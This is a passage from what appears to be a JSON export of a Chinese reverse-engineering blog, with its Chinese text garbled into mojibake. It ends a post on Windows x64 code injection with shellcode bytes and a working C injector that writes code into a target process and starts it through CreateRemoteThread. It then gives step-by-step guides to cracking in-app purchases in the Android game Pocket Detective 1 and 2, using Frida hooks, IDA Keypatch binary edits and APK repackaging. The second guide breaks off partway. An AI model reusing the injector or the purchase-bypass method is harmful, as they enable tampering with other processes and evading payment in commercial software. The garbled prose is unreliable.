0x00, 0x00, //4 0xFF, 0xD0, 0x48, 0x8D, 0x53, 0x1F, 0x48, 0x8B, 0xC8, 0x48, //5 0xB8, 0x60, 0xA3, 0x85, 0xC1, 0xFF, 0x7F, 0x00, 0x00, 0xFF, //6 0xD0, 0x4C, 0x8B, 0xE0, 0xEB, 0x2B, 0x4D, 0x65, 0x73, 0x73, //7 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x00, 0x49, 0x6E, 0x6A, //8 0x65, 0x63, 0x74, 0x65, 0x64, 0x00, 0x75, 0x73, 0x65, 0x72, //9 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x4D, 0x65, 0x73, //10 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00, 0x41, //11 0xB9, 0x10, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC3, 0x48, 0x8D, //12 0x53, 0x0B, 0x48, 0x33, 0xC9, 0x41, 0xFF, 0xD4, 0xEB, 0xEB //13};int main(int argc, char **argv) { if(argc &lt; 2) { printf(&quot;Usage: inject [pid]\\n&quot;); return -1; } //è·å–LoadLibraryAå’ŒGetProcAddressçš„çœŸå®åœ°å€ void *p1 = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); void *p2 = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;GetProcAddress&quot;); //ida_chars[]ä¸­LoadLibraryAä½äºida_chars[42]ï¼ŒGetProcAddressä½äºida_chars[61] *(uint64_t *)(&amp;ida_chars[42]) = (uint64_t)p1; *(uint64_t *)(&amp;ida_chars[61]) = (uint64_t)p2; //å°†ida_chars[]å†™å…¥ç›®æ ‡è¿›ç¨‹å†…å­˜ç©ºé—´ HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1])); if(NULL == hProcess) { printf(&quot;OpenProcess Failed: %d\\n&quot;, GetLastError()); return -1; } void *mem = VirtualAllocEx(hProcess, NULL, sizeof(ida_chars), MEM_COMMIT, PAGE_EXECUTE_READWRITE); if(NULL == mem) { printf(&quot;VirtualAllocEx Failed: %d\\n&quot;, GetLastError()); return -1; } BOOL result = WriteProcessMemory(hProcess, mem, ida_chars, sizeof(ida_chars), NULL); if(!result) { printf(&quot;WriteProcessMemory Failed: %d\\n&quot;, GetLastError()); return -1; } //åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ‰§è¡Œida_chars[]ä¸­çš„ä»£ç  HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, mem, NULL, 0, NULL); if(NULL == hRemoteThread) { printf(&quot;CreateRemoteThread Failed: %d\\n&quot;, GetLastError()); return -1; } printf(&quot;Injected!\\n&quot;); return 0;}","link":"/2021/01/24/windows-self-relocation-64bit-code-inject/"},{"title":"å£è¢‹ä¾¦æ¢1å®‰å“å†…è´­ç ´è§£æµç¨‹","text":"å£è¢‹ä¾¦æ¢æ˜¯ç”±éŸ©å›½NFLY STUDIOäº2013å¹´å·¦å³æ¨å‡ºçš„æ‰‹æœºæ¸¸æˆï¼Œåˆ†ä¸º1ã€2ä¸¤éƒ¨ï¼Œç”±å£è¢‹æ±‰åŒ–ç»„æ±‰åŒ–ã€‚NFLY STUDIOä¼ é—»å·²è§£æ•£ï¼Œè¯¥æ¸¸æˆä¹Ÿå¾ˆä¹…æœªæ›´æ–°ï¼Œå®‰å“ç‰ˆåªèƒ½åœ¨å¾ˆè€çš„Android 4ç¯å¢ƒä¸‹è¿è¡Œã€‚ ç›®å‰ï¼Œç½‘ä¸Šèƒ½ä¸‹è½½åˆ°çš„å£è¢‹ä¾¦æ¢å®‰å“æ±‰åŒ–ç‰ˆä¸»è¦åŒ…æ‹¬ä»¥ä¸‹ç‰ˆæœ¬ï¼š ç‰ˆæœ¬ æ¥æº ç‰¹ç‚¹ ä¸‹è½½ å£è¢‹ä¾¦æ¢1æ±‰åŒ–ç‰ˆ å£è¢‹æ±‰åŒ–ç»„æ±‰åŒ– å­˜åœ¨BGMç¼ºå¤±çš„bug https://shouyou.3dmgame.com/android/588.html å£è¢‹ä¾¦æ¢1æ— é™é‡‘å¸ç‰ˆ å£è¢‹æ±‰åŒ–ç»„æ±‰åŒ–+çˆ±å¾ç ´è§£ åˆå§‹é‡‘å¸ä¿®æ”¹ä¸º25252525 https://www.bilibili.com/video/BV1yL411U7P1/ å£è¢‹ä¾¦æ¢2æ±‰åŒ–ç‰ˆ å£è¢‹æ±‰åŒ–ç»„æ±‰åŒ– æ­£å¸¸ https://shouyou.3dmgame.com/android/1358.html å£è¢‹ä¾¦æ¢2æ— é™é‡‘å¸ç‰ˆ å£è¢‹æ±‰åŒ–ç»„æ±‰åŒ–+çˆ±å¾ç ´è§£ åˆå§‹é‡‘å¸ä¿®æ”¹ä¸º25252525 https://m.25game.com/android/View/4206/ å£è¢‹ä¾¦æ¢1æ±‰åŒ–ç‰ˆå­˜åœ¨çš„BGMç¼ºå¤±é—®é¢˜ï¼Œè¯•éªŒåå‘ç°ï¼Œåªéœ€ç”¨apktoolä½œä¸€ä¸ªç®€å•çš„é‡æ‰“åŒ…å³å¯è§£å†³ã€‚æœ¬æ–‡ä¼šåœ¨3DMä¸Šé¢ä¸‹è½½çš„å£è¢‹ä¾¦æ¢1æ±‰åŒ–ç‰ˆAPKä¸Šè¿›è¡Œå®éªŒã€‚ æ¸¸æˆä¸­æœ‰ä¸€ä¸ªâ€œä¾¦æ¢å•†åº—â€åŠŸèƒ½ï¼Œåœ¨å•†åº—ä¸­è´­ä¹°é‡‘å¸ï¼Œæ¸¸æˆä¼šå¡æ­»ã€‚ æœ¬æ–‡ä¼šä»‹ç»é™¤ä¿®æ”¹åˆå§‹é‡‘å¸å¤–çš„å¦ä¸€ç§ç ´è§£æ€è·¯ï¼Œå³å¯¹â€œä¾¦æ¢å•†åº—â€è¿™ä¸€åŠŸèƒ½è¿›è¡Œç ´è§£ã€‚ æœ¬æ–‡çš„é¡¹ç›®åœ°å€ä¸ºï¼šhttps://github.com/JackNoire/InfinitePrivateEye_CHS ä¸‹è½½å®‰å“4æ¨¡æ‹Ÿå™¨ç›®å‰å¾ˆå¤šå®‰å“æ¨¡æ‹Ÿå™¨éƒ½ä»…æ”¯æŒå®‰å“5åŠä»¥ä¸Šçš„å®‰å“ç‰ˆæœ¬ï¼Œä¾‹å¦‚æ–°ç‰ˆé›·ç”µæ¨¡æ‹Ÿå™¨ä»…æ”¯æŒå®‰å“5.0ã€7.1ã€9.0è¿™å‡ ä¸ªç‰ˆæœ¬ã€‚å¯ä»¥åœ¨è¿™ä¸ªåœ°å€ä¸‹è½½å®‰å“4.3ç‰ˆæœ¬çš„é›·ç”µæ¨¡æ‹Ÿå™¨ï¼š http://res.ldmnq.com/download/1.9.1/ldinst_1.9.1.exe ä¹Ÿå¯ä½¿ç”¨å…¶ä»–çš„å®‰å“4æ¨¡æ‹Ÿå™¨ã€‚ å¯¹ä¾¦æ¢å•†åº—åŠŸèƒ½è¿›è¡Œåˆ†æåˆ†æJavaå±‚å¯åŠ¨å®‰å“æ¨¡æ‹Ÿå™¨ï¼Œç„¶åä½¿ç”¨logcatï¼ˆå¯ä»¥ç”¨Android Studioé‡Œé¢çš„logcatï¼‰ï¼Œç”¨APKçš„åŒ…åï¼ˆcom.creativefactoryï¼‰è¿›è¡Œè¿‡æ»¤ã€‚ æ¥ä¸‹æ¥ï¼Œåœ¨æ¨¡æ‹Ÿå™¨ä¸­å¯åŠ¨APPï¼Œè¿›å…¥ä¾¦æ¢å•†åº—ï¼Œå°è¯•è´­ä¹°é‡‘å¸ã€‚å‘ç°æŠ¥é”™ï¼š&quot;Could not bind to service.&quot; ä½¿ç”¨JADXå¯¹è¯¥APKè¿›è¡Œé™æ€åˆ†æï¼š skylot/jadx: Dex to Java decompiler æœç´¢è¯¥å­—ç¬¦ä¸²ï¼Œå¯ä»¥æ‰¾åˆ°ï¼š ä½¿ç”¨Fridaå¯¹bindToMarketBillingServiceæŒ‚é’©ã€‚ç”±äºè¿è¡Œç¯å¢ƒæ˜¯Android 4ï¼Œæ–°ç‰ˆFridaæ— æ³•åœ¨ä¸Šé¢è¿è¡Œï¼Œå› æ­¤éœ€è¦ä½¿ç”¨è€ç‰ˆçš„Fridaï¼Œè€Œè€ç‰ˆçš„Fridaåˆéœ€è¦è€ç‰ˆçš„Pythonã€‚ ä½¿ç”¨çš„Pythonå’ŒFridaçš„ç‰ˆæœ¬ä¸ºï¼š 123Python==3.8frida==15.1.11frida-tools==10.4.1 é¦–å…ˆåˆ›å»ºä¸€ä¸ªPython 3.8çš„ç¯å¢ƒï¼Œå¦‚æœä½¿ç”¨anacondaåˆ™ï¼š 12conda create -n py38 python=3.8conda activate py38 ç„¶åç”¨pipå®‰è£…ç‰¹å®šç‰ˆæœ¬çš„fridaå’Œfrida-toolsï¼š 12pip install frida==15.1.11pip install frida-tools==10.4.1 pip install fridaæ—¶å¯èƒ½ä¼šå¡ä½ï¼Œåœ¨è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªè§£å†³æ–¹æ³•ï¼š https://github.com/frida/frida/issues/2012 ä¹Ÿå°±æ˜¯è¿›å…¥è¿™ä¸ªç½‘ç«™ï¼šhttps://pypi.org/project/frida/15.1.11/#files ä¸‹è½½frida-15.1.11-py3.8-win-amd64.eggï¼Œç„¶åå°†è¯¥æ–‡ä»¶ä¸¢åˆ°C:\\Users\\ç”¨æˆ·åè¿™ä¸ªè·¯å¾„ä¸‹ï¼Œä¾‹å¦‚æˆ‘çš„ç”µè„‘ä¸Šæ˜¯C:\\Users\\lenovoã€‚ä¹‹åå†é‡æ–°æ‰§è¡Œpip installå‘½ä»¤ã€‚ å®‰è£…å®Œfridaåï¼Œå†æŒ‚é’©bindToMarketBillingServiceï¼Œç¼–å†™JSè„šæœ¬test.jsï¼š 123456789101112setTimeout(function () { Java.perform(function () { let BillingService = Java.use(&quot;com.creativefactory.BillingService&quot;); BillingService[&quot;bindToMarketBillingService&quot;].implementation = function () { console.log(`BillingService.bindToMarketBillingService is called`); let result = this[&quot;bindToMarketBillingService&quot;](); console.log(`BillingService.bindToMarketBillingService result=${result}`); console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Exception&quot;).$new())); return result; }; });}, 0); å¯åŠ¨å®‰å“æ¨¡æ‹Ÿå™¨ï¼Œå®‰è£…å£è¢‹ä¾¦æ¢1çš„APKæ–‡ä»¶ã€‚getpropæ£€æŸ¥æ¨¡æ‹Ÿå™¨æ¶æ„ä¸ºx86ï¼š 12&gt; adb shell getprop ro.product.cpu.abix86 adb pushæ”¾å…¥x86çš„15.1.11ç‰ˆæœ¬frida-serverï¼Œadb shell chmodä¿®æ”¹è¿è¡Œæƒé™ï¼Œç„¶åè¿è¡Œï¼š 12&gt; adb shell# /data/local/tmp/frida-server-15.1.11-android-x86 åœ¨ç”µè„‘ä¸Šæ‰§è¡Œå‘½ä»¤æŒ‚é’©ï¼š 12frida -U -l test.js -f com.creativefactoryå†è¾“å…¥%resume è¾“å‡ºå¦‚ä¸‹ï¼š 12345678910111213141516171819BillingService.bindToMarketBillingService is calledBillingService.bindToMarketBillingService result=falsejava.lang.Exception at com.creativefactory.BillingService.bindToMarketBillingService(Native Method) at com.creativefactory.BillingService.bindToMarketBillingService(Native Method) at com.creativefactory.BillingService.bindToMarketBillingService(Native Method) at com.creativefactory.BillingService.access$0(BillingService.java:417) at com.creativefactory.BillingService$BillingRequest.runRequest(BillingService.java:100) at com.creativefactory.BillingService.requestPurchase(BillingService.java:457) at com.creativefactory.ExecuteBilling$1.run(ExecuteBilling.java:74) at android.os.Handler.handleCallback(Handler.java:730) at android.os.Handler.dispatchMessage(Handler.java:92) at android.os.Looper.loop(Looper.java:137) at android.app.ActivityThread.main(ActivityThread.java:5103) at java.lang.reflect.Method.invokeNative(Native Method) at java.lang.reflect.Method.invoke(Method.java:525) at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:737) at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553) at dalvik.system.NativeStart.main(Native Method) ç”±stacktraceå¯ä»¥æ‰¾åˆ°purchaseItemï¼š äºæ˜¯ï¼Œå†å¯¹purchaseItemæŒ‚é’©ï¼š 12345678910setTimeout(function () { Java.perform(function () { let ExecuteBilling = Java.use(&quot;com.creativefactory.ExecuteBilling&quot;); ExecuteBilling[&quot;purchaseItem&quot;].implementation = function (pID) { console.log(`ExecuteBilling.purchaseItem is called: pID=${pID}`); console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Exception&quot;).$new())); this[&quot;purchaseItem&quot;](pID); }; });}, 0); è¾“å‡ºå¦‚ä¸‹ï¼š 12345678910ExecuteBilling.purchaseItem is called: pID=com.creativefactory.timeprivate.10000pjava.lang.Exception at com.creativefactory.ExecuteBilling.purchaseItem(Native Method) at com.creativefactory.ExecuteBilling.purchaseItem(Native Method) at com.creativefactory.ExecuteBilling.purchaseItem(Native Method) at com.creativefactory.SqliteManager.purchaseItem(SqliteManager.java:234) at org.cocos2dx.lib.Cocos2dxRenderer.nativeRender(Native Method) at org.cocos2dx.lib.Cocos2dxRenderer.onDrawFrame(Cocos2dxRenderer.java:59) at android.opengl.GLSurfaceView$GLThread.guardedRun(GLSurfaceView.java:1534) at android.opengl.GLSurfaceView$GLThread.run(GLSurfaceView.java:1251) ä¹Ÿå°±æ˜¯è¯´ï¼Œæ˜¯ä»nativeå±‚ä»£ç è°ƒç”¨çš„Javaå±‚çš„SqliteManager.purchaseItemï¼Œç„¶åSqliteManager.purchaseItemå†å»è°ƒç”¨ExecuteBilling.purchaseItem å¯ä»¥çŒœæµ‹ï¼Œæ¸¸æˆä¸»è¦é€»è¾‘å†™åœ¨nativeå±‚ï¼Œç‚¹å‡»ä»˜è´¹åä¼šè°ƒç”¨Javaå±‚å‡½æ•°ï¼Œåœ¨Javaå±‚å¤„ç†å®Œä»˜è´¹åï¼Œä¼šå›åˆ°nativeå±‚ï¼Œç»§ç»­æ‰§è¡Œä»˜è´¹æˆåŠŸ/å¤±è´¥çš„æ¸¸æˆé€»è¾‘ã€‚äºæ˜¯ï¼Œåœ¨JADXä¸­æœç´¢nativeå‡½æ•°ï¼Œæ‰¾åˆ°nativeå‡½æ•°com.creativefactory.TimePrivate.receiveResultï¼Œåœ¨com.creativefactory.PurchaseObserver.onRequestPurchaseResponseè¿™é‡Œè¢«è°ƒç”¨ï¼š åˆ†ænativeå±‚apktoolå¯¹apkæ–‡ä»¶è§£åŒ…ï¼š 1apktool d koudaizhentan.apk åœ¨lib/armeabiä¸­çœ‹åˆ°è¿™å››ä¸ªæ–‡ä»¶ï¼š 1234libcocos2d.solibcocosdenshion.solibgame.solibgame_logic.so ç”±äºæ˜¯x86æ¨¡æ‹Ÿå™¨ï¼Œæ²¡æ³•ç›´æ¥ç”¨fridaæŒ‚é’©armçš„å‡½æ•°ï¼Œæ‰€ä»¥åªèƒ½é™æ€åˆ†æã€‚ä½¿ç”¨IDA Proåˆ†æï¼Œåœ¨libgame_logic.soé‡Œé¢å‘ç°å¯¹Javaå±‚purchaseItemçš„è°ƒç”¨ï¼š ç”¨å¿«æ·é”®xå¾€ä¸ŠæŸ¥æ‰¾è¯¥å‡½æ•°çš„xrefsï¼Œå¯ä»¥æ‰¾åˆ°MJScene::runPurchaseItemï¼š è¿™ä¸ªå‡½æ•°é‡Œå¯¹ä¸€ä¸ªæ•°ç»„ä½œäº†èµ‹å€¼æ“ä½œï¼Œç„¶åè°ƒç”¨äº†purchaseItemã€‚ è€Œåœ¨ShopLayer::_runBuyItemé‡Œè°ƒç”¨äº†MJScene::runPurchaseItemï¼Œè¿™é‡ŒGameInfo::sharedå‡½æ•°è¿”å›çš„åœ°å€+60çš„åœ°æ–¹ï¼Œå°±æœ‰ä¸‹æ ‡ä¸º64å’Œ66çš„åœ°æ–¹åˆ†åˆ«è¢«èµ‹å€¼äº†_completeBuyItemå’Œ_failedBuyItemè¿™ä¸¤ä¸ªå‡½æ•°ã€‚ ShopLayer::_buySelectedItemå‡ºç°äº†ShopLayer::_runBuyItemï¼š è”æƒ³åˆ°æ¸¸æˆä¸­ä¾¦æ¢å•†åº—è´­ä¹°ç‰©å“ä¼šå¼¹ä¸€ä¸ªçª—ï¼Œè®©ç©å®¶é€‰ç¡®è®¤ï¼Œå†ç”±è¿™ä¸ªå‡½æ•°åï¼ŒçŒœæµ‹è¿™é‡Œå¯èƒ½æ˜¯å¼¹ä¸€ä¸ªçª—ï¼Œç‚¹å‡»çª—å£ä¸­çš„â€œç¡®å®šâ€å°±ä¼šæ‰§è¡ŒShopLayer::_runBuyItemè¿™ä¸ªå‡½æ•°ã€‚ æ¥ä¸‹æ¥ï¼Œå†åˆ†æå¦‚æœäº¤æ˜“æˆåŠŸï¼Œä¼šæ‰§è¡Œå“ªæ®µä»£ç ã€‚åœ¨libgame_logic.soä¸­æœç´¢nativeå‡½æ•°receiveResultï¼Œæ‰¾åˆ°Java_com_creativefactory_TimePrivate_receiveResult å¦‚æœäº¤æ˜“æˆåŠŸï¼Œä¼šæ‰§è¡ŒMJScene::completePurchaseItem IDA Proåœ¨åç¼–è¯‘æ—¶ï¼Œå¯èƒ½å¼„é”™å‚æ•°çš„ä¸ªæ•°ã€‚æŸ¥æ‰¾ç½‘ä¸Šcocos2dçš„ä»£ç ç¤ºä¾‹ï¼Œæ‰¾åˆ°ï¼š 123this-&gt;runAction(CCSequence::actions(CCDelayTime::actionWithDuration(3),CCCallFunc::actionWithTarget(this, callfunc_selector(GameOverLayer::gameOverDone)),NULL)); actionWithTargetåº”è¯¥è‡³å°‘æœ‰ä¸¤ä¸ªå‚æ•°ã€‚å¦‚æœå‚æ•°ä¸ªæ•°ä¸å¯¹ï¼Œå¯ä»¥å³é”®actionWithTargetâ†’Set item typeâ€¦ï¼Œç„¶åä¿®æ”¹å‡½æ•°å‚æ•°ä¸ºä¸¤ä¸ªä»¥ä¸Šï¼š è€Œåœ¨MJScene::failedPurchaseItemä¸­ï¼Œåˆ™æ˜¯ï¼š ä¹‹å‰å·²ç»çŸ¥é“ï¼ŒæŸä¸ªä¸‹æ ‡ä¸º64çš„åœ°æ–¹è¢«èµ‹å€¼äº†ä¸‹æ ‡ä¸º64å’Œ66çš„åœ°æ–¹åˆ†åˆ«è¢«èµ‹å€¼äº†ShopLayer::_completeBuyItemå’ŒShopLayer::_failedBuyItemè¿™ä¸¤ä¸ªå‡½æ•°ã€‚è¿™é‡Œä¹Ÿå‡ºç°äº†64å’Œ66è¿™ä¸¤ä¸ªä¸‹æ ‡ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™é‡ŒMJScene::completePurchaseItemå¾ˆå¯èƒ½æœ€ç»ˆä¼šä»¥æŸç§æ–¹å¼å»è°ƒç”¨ShopLayer::_completeBuyItemã€‚ åœ¨ShopLayer::_completeBuyItemä¸­ä¼šå‘ç°ä¼¼ä¹æ˜¯ä¼šå»è°ƒç”¨ShopLayer::_showCompletePopupï¼š ç²—ç•¥æŸ¥çœ‹ä¸€ä¸‹_showCompletePopupï¼Œé‡Œé¢å†…å®¹éå¸¸å¤æ‚ï¼ŒçŒœæµ‹ä¼šæ›´æ–°é‡‘å¸æ•°é‡ã€‚ äºæ˜¯ï¼Œè€ƒè™‘å¯¹nativeå±‚çš„å†…å®¹è¿›è¡Œä¿®æ”¹ï¼Œåœ¨ç‚¹å‡»ç¡®è®¤äº¤æ˜“çš„å¼¹çª—åï¼Œè°ƒç”¨ShopLayer::_runBuyItemæ—¶ï¼Œå»è°ƒç”¨ShopLayer::_showCompletePopupã€‚ Keypatchä¿®æ”¹nativeå‡½æ•°å†…å®¹ä½¿ç”¨IDA Proçš„Keypatchæ’ä»¶ä¿®æ”¹ShopLayer::_runBuyItemçš„å†…å®¹ï¼Œè®©å®ƒè°ƒç”¨ShopLayer::_showCompletePopupã€‚ åœ¨ShopLayer::_runBuyItemä¸­ï¼Œä»std::string::compareå¼€å§‹ä¿®æ”¹ï¼Œç›´æ¥ä¿®æ”¹ä¸ºä¸€ä¸ªå¯¹ShopLayer::_showCompletePopupçš„è°ƒç”¨ã€‚ ShopLayer::_completeBuyIteméœ€è¦ä¼ ä¸¤ä¸ªå‚æ•°è¿›å»ï¼Œä¸€ä¸ªShopLayer *thisï¼Œä¸€ä¸ªæµ®ç‚¹æ•°ã€‚ æµ®ç‚¹æ•°å¯ä»¥å°±ä¼ ä¸€ä¸ª0ã€‚è€Œå¯¹äºè¿™ä¸ªShopLayer *thisï¼Œæ°å¥½ShopLayer::_runBuyItemçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¹Ÿæ˜¯ShopLayer *thisã€‚æ‰€ä»¥å¯ä»¥ç›´æ¥å°†ShopLayer::_runBuyItemçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¼ ç»™ShopLayer::_completeBuyItemã€‚ ä»SUB SP, SP, #0x2Cåé¢ä¸€æ¡ï¼Œå³.text:000A9B96å¼€å§‹ä¿®æ”¹ã€‚ è¿™ä¸ªåœ°æ–¹R0çš„å€¼è¿˜æ²¡è¢«ä¿®æ”¹ï¼Œæ‰€ä»¥è¿˜ç­‰äºShopLayer::_runBuyItemçš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚åªéœ€è¦å°†ç¬¬äºŒä¸ªå‚æ•°è®¾ç½®ä¸º0.0ï¼Œç„¶åè°ƒç”¨ShopLayer::_completeBuyItemå³å¯ã€‚ Keypatchçš„ä½¿ç”¨æ–¹æ³•ï¼šCtrl+Alt+Kï¼Œæˆ–Editâ†’Keypatchâ†’Patcherï¼Œå†è¾“å…¥æŒ‡ä»¤å³å¯ã€‚ ä¿®æ”¹åï¼š ç„¶åï¼ŒEditâ†’Patch programâ†’Apply patches to input fileï¼Œå°†ä¿®æ”¹å†™åˆ°æ–‡ä»¶é‡Œã€‚ apktoolé‡æ‰“åŒ…å¹¶ç­¾ååœ¨é‡æ‰“åŒ…å‰ï¼Œè®°å¾—å°†lib/armeabiè·¯å¾„ä¸‹IDA Proç”Ÿæˆçš„idbæ–‡ä»¶ç§»å‡ºæ¥ï¼Œä»¥å…è¿™ä¸ªæ–‡ä»¶è¢«æ‰“åŒ…è¿›apkã€‚ åœ¨è§£åŒ…çš„æ–‡ä»¶å¤¹è·¯å¾„ä¸‹ï¼Œæ‰§è¡Œï¼š 1apktool b . ç„¶åä½¿ç”¨Java JDKé‡Œçš„keytoolå’Œjarsignerè¿›è¡Œç­¾åï¼Œè¿™ä¸¤ä¸ªå·¥å…·é€šå¸¸åœ¨%JAVA_HOME%\\biné‡Œé¢ã€‚ å»ºè®®ä½¿ç”¨jdk1.8.0_202ç‰ˆæœ¬æˆ–è¿™ä¸ªé™„è¿‘çš„ç‰ˆæœ¬ã€‚å¦‚æœä½¿ç”¨æ–°ç‰ˆJavaï¼ˆä¾‹å¦‚Java 17ï¼‰ä¸­çš„å·¥å…·ç­¾åï¼Œåœ¨Android 4ä¸­å¯èƒ½æŠ¥é”™ï¼šINSTALL_PARSE_FAILED_UNEXPECTED_EXCEPTION 123cd distkeytool -genkey -v -keystore my-release-key.keystore -alias cert -keyalg RSA -keysize 2048 -sigalg SHA1withRSA -validity 10000jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore koudaizhentan.apk cert æˆ‘ä½¿ç”¨çš„apktoolç‰ˆæœ¬ä¸º2.7.0ï¼Œå¦‚æœä½¿ç”¨è€ç‰ˆçš„apktoolï¼Œå¯èƒ½è¿˜éœ€è¦ç”¨zipalignå¯¹é½ã€‚ æœ€åï¼Œåœ¨é›·ç”µæ¨¡æ‹Ÿå™¨ä¸Šå¸è½½å¹¶é‡æ–°å®‰è£…æ–°çš„å£è¢‹ä¾¦æ¢APKæ–‡ä»¶ã€‚è¿›å…¥ä¾¦æ¢å•†åº—å¹¶è´­ä¹°é‡‘å¸ï¼š","link":"/2024/02/22/crack-koudaizhentan-1/"},{"title":"å£è¢‹ä¾¦æ¢2å®‰å“å†…è´­ç ´è§£æµç¨‹","text":"åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»‹ç»äº†å£è¢‹ä¾¦æ¢1çš„ç ´è§£æµç¨‹ã€‚æœ¬æ–‡ä¼šä»‹ç»å£è¢‹ä¾¦æ¢2çš„ç ´è§£æµç¨‹ã€‚ æœ¬æ–‡ä½¿ç”¨çš„æ˜¯ä»3DMä¸‹è½½çš„å£è¢‹æ±‰åŒ–ç»„æ±‰åŒ–ç‰ˆæœ¬ã€‚ æœ¬æ–‡çš„é¡¹ç›®åœ°å€ä¸ºï¼šhttps://github.com/JackNoire/InfinitePrivateEye_CHS åˆ†æJavaå±‚å’Œå£è¢‹ä¾¦æ¢1ç±»ä¼¼ï¼Œè¿˜æ˜¯å…ˆè¿›å…¥å•†åº—ï¼Œé€‰æ‹©æ”¯ä»˜ï¼Œç„¶åè¿›logcatçœ‹æŠ¥é”™ä¿¡æ¯ï¼š æœç´¢å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°ï¼š ä½¿ç”¨Fridaå¯¹è¯¥å‡½æ•°æŒ‚é’©ï¼Œæ³¨æ„ä½¿ç”¨æ—§ç‰ˆçš„Pythonå’Œfridaï¼š 123Python==3.8frida==15.1.11frida-tools==10.4.1 test.jsï¼š 123456789setTimeout(function () { Java.perform(function () { let IabHelper = Java.use(&quot;com.nflystudio.InfinitePrivateEye2.util.IabHelper&quot;); IabHelper[&quot;logError&quot;].implementation = function (msg) { console.log(`IabHelper.logError is called: msg=${msg}`); this[&quot;logError&quot;](msg); }; });}, 0); æ‰§è¡Œï¼š 12frida -U -l test.js -f com.nflystudio.InfinitePrivateEye2ç„¶åæ‰§è¡Œ%resume åœ¨APPé‡Œè¿›å…¥å•†åº—ï¼Œæ‰§è¡Œæ”¯ä»˜æ“ä½œï¼Œå¾—åˆ°ï¼š 1234567891011121314IabHelper.logError is called: msg=Illegal state for operation (launchPurchaseFlow): IAB helper is not set up.java.lang.Exception at com.nflystudio.InfinitePrivateEye2.util.IabHelper.logError(Native Method) at com.nflystudio.InfinitePrivateEye2.util.IabHelper.logError(Native Method) at com.nflystudio.InfinitePrivateEye2.util.IabHelper.logError(Native Method) at com.nflystudio.InfinitePrivateEye2.util.IabHelper.checkSetupDone(IabHelper.java:755) at com.nflystudio.InfinitePrivateEye2.util.IabHelper.launchPurchaseFlow(IabHelper.java:357) at com.nflystudio.InfinitePrivateEye2.util.IabHelper.launchPurchaseFlow(IabHelper.java:324) at com.nflystudio.InfinitePrivateEye2.InfinitePrivateEye2.purchaseItem(InfinitePrivateEye2.java:182) at com.nflystudio.InfinitePrivateEye2.SqliteManager.purchaseItem(SqliteManager.java:254) at org.cocos2dx.lib.Cocos2dxRenderer.nativeRender(Native Method) at org.cocos2dx.lib.Cocos2dxRenderer.onDrawFrame(Cocos2dxRenderer.java:94) at android.opengl.GLSurfaceView$GLThread.guardedRun(GLSurfaceView.java:1534) at android.opengl.GLSurfaceView$GLThread.run(GLSurfaceView.java:1251) äºæ˜¯å¯ä»¥æ‰¾åˆ°è¿™ä¸ªå‡½æ•°ï¼šcom.nflystudio.InfinitePrivateEye2.SqliteManager.purchaseItem ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¸¸æˆé€»è¾‘å†™åœ¨nativeé‡Œï¼Œå½“ç‚¹å‡»æ”¯ä»˜åï¼Œä¼šè°ƒç”¨Javaçš„è¿™ä¸ªpurchaseItemå‡½æ•°ã€‚ æ¥ä¸‹æ¥ï¼Œæœç´¢nativeå‡½æ•°ï¼Œä¼šå‘ç°å’Œå£è¢‹ä¾¦æ¢1ç›¸åŒï¼Œä¹Ÿæœ‰ä¸€ä¸ªåä¸ºreceiveResultçš„nativeå‡½æ•°ï¼š å¦‚æœæ”¯ä»˜æˆåŠŸï¼ŒJavaå±‚å°±ä¼šè°ƒç”¨è¿™ä¸ªreceiveResultå‡½æ•°ï¼Œå†å›åˆ°nativeå±‚ã€‚ åˆ†ænativeå±‚å£è¢‹ä¾¦æ¢2åªæœ‰ä¸€ä¸ªsoæ–‡ä»¶ï¼Œlibgame.soï¼Œç”¨IDA Proåˆ†æè¯¥æ–‡ä»¶ï¼Œä¼šå‘ç°å’Œå£è¢‹ä¾¦æ¢1å·®ä¸å¤šã€‚ é¦–å…ˆæ‰¾SqliteManager.purchaseItemï¼Œå¯ä»¥æ‰¾åˆ°SqliteManagerJni::purchaseItemJniï¼š æ‰¾å®ƒçš„xrefsï¼Œæœ€ç»ˆå¯ä»¥æ‰¾åˆ°ShopLayer::_runBuyItemè°ƒç”¨MJScene::runPurchaseItemï¼Œè€Œåœ¨runPurchaseItemé‡Œé¢ï¼Œä¹Ÿæ˜¯ä¸€æ ·çš„å…ˆç»™æ•°ç»„èµ‹å€¼ï¼Œå†è°ƒç”¨purchaseItemå‡½æ•°ï¼š å†çœ‹receiveResultï¼Œåœ¨nativeå±‚åå­—å«Java_com_nflystudio_InfinitePrivateEye2_InfinitePrivateEye2_receiveResultï¼Œè¿™ä¸ªå’Œå£è¢‹ä¾¦æ¢1ä¹Ÿä¸€æ ·ï¼š è€Œåœ¨completePurchaseItemé‡Œé¢ï¼Œä¹Ÿæ˜¯é€šè¿‡æŸç§æ–¹å¼å»è°ƒç”¨ShopLayer::_completeBuyItem ç»“æ„åŸºæœ¬ä¸Šå’Œå£è¢‹ä¾¦æ¢1ä¸€æ ·ï¼Œæ‰€ä»¥ç ´è§£æ€è·¯ä¹Ÿå’Œå£è¢‹ä¾¦æ¢1ä¸€æ 